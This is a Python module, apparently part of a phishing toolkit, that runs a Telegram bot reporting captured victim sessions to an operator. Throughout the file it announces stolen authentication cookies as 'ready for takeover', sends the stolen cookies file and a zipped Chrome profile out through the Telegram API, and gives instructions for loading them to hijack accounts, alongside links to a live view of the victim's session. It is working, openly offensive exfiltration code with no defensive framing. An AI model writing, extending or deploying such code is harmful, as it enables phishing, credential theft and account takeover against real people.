#!/usr/bin/env python3
"""
Telegram Bot - Clean alerts with inline buttons
"""

import asyncio
import aiohttp
import json
import os
import zipfile
import tempfile
from pathlib import Path
from typing import Optional, Dict, Any
from datetime import datetime


class TelegramBot:
    """Professional Telegram bot with inline buttons"""
    
    def __init__(self, bot_token: Optional[str], chat_id: Optional[str], domain: str = "localhost"):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.domain = domain
        self.base_url = f"https://api.telegram.org/bot{bot_token}" if bot_token else None
        self.sent_alerts: Dict[str, datetime] = {}  # Prevent spam
        self.alert_cooldown = 30  # seconds between same alert type per session
    
    @property
    def is_configured(self) -> bool:
        return bool(self.bot_token and self.chat_id)
    
    def _can_send(self, session_id: str, alert_type: str) -> bool:
        """Rate limit alerts to prevent spam"""
        key = f"{session_id}:{alert_type}"
        now = datetime.now()
        
        if key in self.sent_alerts:
            elapsed = (now - self.sent_alerts[key]).total_seconds()
            if elapsed < self.alert_cooldown:
                return False
        
        self.sent_alerts[key] = now
        return True
    
    async def _request(self, method: str, **kwargs) -> Optional[Dict]:
        """Make API request"""
        if not self.is_configured:
            return None
        
        url = f"{self.base_url}/{method}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, **kwargs) as response:
                    if response.status == 200:
                        return await response.json()
                    else:
                        print(f"[Telegram] Error: {response.status}")
                        return None
        except Exception as e:
            print(f"[Telegram] Exception: {e}")
            return None
    
    async def send_message(self, text: str, buttons: list = None, parse_mode: str = "HTML") -> bool:
        """Send message with optional inline buttons"""
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        
        if buttons:
            payload["reply_markup"] = json.dumps({
                "inline_keyboard": buttons
            })
        
        result = await self._request("sendMessage", json=payload)
        return result is not None
    
    async def send_document(self, file_path: str, caption: str = "", buttons: list = None) -> bool:
        """Send a file with optional caption and buttons"""
        if not self.is_configured or not Path(file_path).exists():
            return False
        
        data = aiohttp.FormData()
        data.add_field('chat_id', self.chat_id)
        data.add_field('document', open(file_path, 'rb'), filename=Path(file_path).name)
        
        if caption:
            data.add_field('caption', caption)
            data.add_field('parse_mode', 'HTML')
        
        if buttons:
            data.add_field('reply_markup', json.dumps({"inline_keyboard": buttons}))
        
        result = await self._request("sendDocument", data=data)
        return result is not None
    
    async def alert_session_start(self, session_id: str, target_url: str) -> bool:
        """Alert: New session started"""
        if not self._can_send(session_id, "start"):
            return False
        
        text = (
            f"🟢 <b>Session Active</b>\n\n"
            f"<b>ID:</b> <code>{session_id}</code>\n"
            f"<b>Target:</b> {target_url}\n"
            f"<b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"
        )
        
        buttons = [[
            {"text": "📺 Watch Live", "url": f"http://{self.domain}:6080/vnc.html"},
            {"text": "📊 Dashboard", "url": f"http://{self.domain}"}
        ]]
        
        return await self.send_message(text, buttons)
    
    async def alert_auth_captured(self, session_id: str, cookie_count: int, auth_cookies: list, loot_path: str) -> bool:
        """Alert: Authentication cookies captured - THE IMPORTANT ONE"""
        # Always send auth alerts (no cooldown)
        self.sent_alerts.pop(f"{session_id}:auth", None)
        
        # Format top auth cookies
        cookie_preview = ""
        for c in auth_cookies[:5]:
            cookie_preview += f"  • <code>{c.get('name', 'unknown')}</code>\n"
        
        text = (
            f"🔐 <b>AUTH CAPTURED!</b>\n\n"
            f"<b>Session:</b> <code>{session_id}</code>\n"
            f"<b>Auth Cookies:</b> {len(auth_cookies)}\n"
            f"<b>Total Cookies:</b> {cookie_count}\n\n"
            f"<b>Key Cookies:</b>\n{cookie_preview}\n"
            f"✅ <i>Session ready for takeover</i>"
        )
        
        buttons = [
            [
                {"text": "📥 Download Cookies", "callback_data": f"download:{session_id}:cookies"},
                {"text": "📦 Download Profile", "callback_data": f"download:{session_id}:profile"}
            ],
            [
                {"text": "📺 Watch Session", "url": f"http://{self.domain}:6080/vnc.html"},
                {"text": "📊 Dashboard", "url": f"http://{self.domain}"}
            ]
        ]
        
        return await self.send_message(text, buttons)
    
    async def send_cookies_file(self, session_id: str, cookies_path: str) -> bool:
        """Send cookies.json file"""
        if not Path(cookies_path).exists():
            return False
        
        caption = f"🍪 <b>Cookies - {session_id}</b>\n\nImport with EditThisCookie or similar extension"
        
        return await self.send_document(cookies_path, caption)
    
    async def send_profile_zip(self, session_id: str, profile_path: str) -> bool:
        """Zip and send Chrome profile"""
        profile_dir = Path(profile_path)
        if not profile_dir.exists():
            return False
        
        # Create zip
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
            zip_path = tmp.name
        
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for file in profile_dir.rglob('*'):
                    if file.is_file():
                        zf.write(file, file.relative_to(profile_dir))
            
            caption = (
                f"📦 <b>Chrome Profile - {session_id}</b>\n\n"
                f"<b>Usage:</b>\n"
                f"1. Extract to a folder\n"
                f"2. Run: <code>chrome --user-data-dir=./profile</code>"
            )
            
            return await self.send_document(zip_path, caption)
        finally:
            Path(zip_path).unlink(missing_ok=True)
    
    async def alert_cookies_update(self, session_id: str, count: int, auth_count: int) -> bool:
        """Alert: Cookie count update (rate limited)"""
        if not self._can_send(session_id, "cookies"):
            return False
        
        # Only alert if significant
        if count < 10 and auth_count == 0:
            return False
        
        text = (
            f"🍪 <b>Cookies Update</b>\n\n"
            f"<b>Session:</b> <code>{session_id}</code>\n"
            f"<b>Total:</b> {count} | <b>Auth:</b> {auth_count}"
        )
        
        return await self.send_message(text)


# Global instance
_bot: Optional[TelegramBot] = None


def get_bot() -> TelegramBot:
    """Get or create bot instance"""
    global _bot
    if _bot is None:
        _bot = TelegramBot(
            bot_token=os.environ.get("TELEGRAM_BOT_TOKEN"),
            chat_id=os.environ.get("TELEGRAM_CHAT_ID"),
            domain=os.environ.get("PHISHING_DOMAIN", "localhost")
        )
    return _bot


async def test_telegram():
    """Test bot connection"""
    bot = get_bot()
    if bot.is_configured:
        success = await bot.send_message(
            "✅ <b>Bot Connected</b>\n\nPhishing toolkit ready.",
            buttons=[[{"text": "📊 Open Dashboard", "url": f"http://{bot.domain}"}]]
        )
        print(f"Test: {'OK' if success else 'FAILED'}")
    else:
        print("Bot not configured")


if __name__ == "__main__":
    asyncio.run(test_telegram())
